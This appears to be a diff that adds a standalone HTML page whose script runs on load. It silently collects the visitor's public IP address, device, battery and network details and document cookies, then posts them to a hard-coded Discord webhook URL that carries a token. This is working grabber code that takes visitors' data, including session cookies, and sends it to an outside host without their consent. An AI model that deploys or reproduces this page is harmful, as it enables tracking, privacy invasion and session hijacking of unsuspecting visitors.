@@ -1,1 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Send Data to Discord Webhook</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f0f0f0;
+      color: #333;
+      margin: 20px;
+      padding: 20px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    h1 {
+      color: #007bff;
+    }
+    pre {
+      white-space: pre-wrap;
+    }
+  </style>
+</head>
+<body>
+  <h1>Data Sent to Discord Webhook</h1>
 
+  <script>
+    (async () => {
+      try {
+        // Fetch the IP address from api.ipify.org
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        if (!ipResponse.ok) {
+          throw new Error("Failed to fetch IP address.");
+        }
+        const ipData = await ipResponse.json();
+        const ipAddress = ipData.ip;
+
+        // Gather device information
+        const screenWidth = screen.width;
+        const screenHeight = screen.height;
+        const os = navigator.platform;
+        const browser = navigator.userAgent;
+
+        // Detect device type and brand
+        let deviceType = 'Desktop';
+        let deviceBrand = 'Unknown';
+        if (/Mobi|Android/i.test(navigator.userAgent)) {
+          deviceType = 'Mobile';
+          deviceBrand = /Android/i.test(navigator.userAgent) ? 'Android' : 'Unknown';
+        } else if (/iPad|iPhone|iPod/i.test(navigator.userAgent)) {
+          deviceType = 'Mobile';
+          deviceBrand = 'Apple';
+        } else if (/Mac/i.test(navigator.userAgent)) {
+          deviceBrand = 'Apple';
+        } else if (/Win/i.test(navigator.userAgent)) {
+          deviceBrand = 'Windows PC';
+        } else if (/Linux/i.test(navigator.userAgent)) {
+          deviceBrand = 'Linux PC';
+        }
+
+        // Get battery information
+        let batteryInfo = {};
+        if (navigator.getBattery) {
+          const battery = await navigator.getBattery();
+          batteryInfo = {
+            level: battery.level * 100 + '%',
+            charging: battery.charging ? 'Yes' : 'No'
+          };
+        } else {
+          batteryInfo = { level: 'N/A', charging: 'N/A' };
+        }
+
+        // Get network information
+        let networkInfo = {};
+        if ('connection' in navigator) {
+          const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+          networkInfo = {
+            type: connection.effectiveType || 'N/A',
+            downlink: connection.downlink + ' Mbps' || 'N/A',
+            rtt: connection.rtt + ' ms' || 'N/A'
+          };
+        } else {
+          networkInfo = { type: 'N/A', downlink: 'N/A', rtt: 'N/A' };
+        }
+
+        // Get graphics card information
+        let graphicsCard = 'Unknown';
+        const gpu = navigator.userAgent.match(/(NVIDIA|AMD|Intel).*?([a-zA-Z0-9]+)/);
+        if (gpu && gpu.length >= 3) {
+          graphicsCard = `${gpu[1]} ${gpu[2]}`;
+        }
+
+        // Get processor information
+        let processor = 'Unknown';
+        const cpu = navigator.userAgent.match(/(Intel|AMD) ([^)]+)/);
+        if (cpu && cpu.length >= 3) {
+          processor = `${cpu[1]} ${cpu[2]}`;
+        }
+
+        // Get cookies
+        const cookies = document.cookie;
+
+        // Format the data into a readable message
+        const message = `
+          IP Address: ${ipAddress}
+          Screen Width: ${screenWidth}
+          Screen Height: ${screenHeight}
+          Graphics Card: ${graphicsCard}
+          Processor: ${processor}
+          OS: ${os}
+          Browser: ${browser}
+          Device Type: ${deviceType}
+          Device Brand: ${deviceBrand}
+          Battery Level: ${batteryInfo.level}
+          Charging: ${batteryInfo.charging}
+          Network Type: ${networkInfo.type}
+          Network Downlink: ${networkInfo.downlink}
+          Network RTT: ${networkInfo.rtt}
+          Cookies: ${cookies || 'None'}
+        `;
+
+        const data = {
+          content: '```' + message + '```',
+        };
+
+        // Log the data to be sent
+        console.log("Data to be sent:", data);
+
+        const webhookResponse = await fetch("https://discord.com/api/webhooks/1256927405847609367/cWHPWQhtaFgSmoAr2jLpwfn8Df-Lly9MSl74p6MpSGvZ-2n_wqhzVG-ZcjNKqhKB_NGQ", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify(data)
+        });
+
+        if (webhookResponse.ok) {
+          console.log("Data sent successfully.");
+          document.body.innerHTML = "<h1>All Data Sent Successfully!</h1>";
+        } else {
+          throw new Error("Failed to send data to Discord webhook.");
+        }
+      } catch (error) {
+        console.error("Error: ", error);
+        document.body.innerHTML = "<h1>Error: " + error.message + "</h1>";
+      }
+    })();
+  </script>
+</body>
+</html>
